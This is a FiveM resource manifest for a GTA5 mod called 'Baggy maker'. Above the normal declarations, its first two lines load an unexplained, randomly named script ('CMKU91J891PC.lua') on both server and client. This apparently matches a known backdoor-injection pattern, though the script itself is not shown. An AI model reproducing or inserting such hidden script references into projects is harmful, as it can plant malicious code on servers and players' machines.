server_script "CMKU91J891PC.lua"
client_script "CMKU91J891PC.lua"
fx_version 'cerulean'
game 'gta5'

description 'Baggy maker'
version '1.0'
author 'Luniz'

lua54 'yes'

client_scripts{
    'gecko-cl.lua',
}

server_scripts{
    'gecko-sv.lua',
}

shared_scripts{
    'config.lua',
    '@ox_lib/init.lua',
}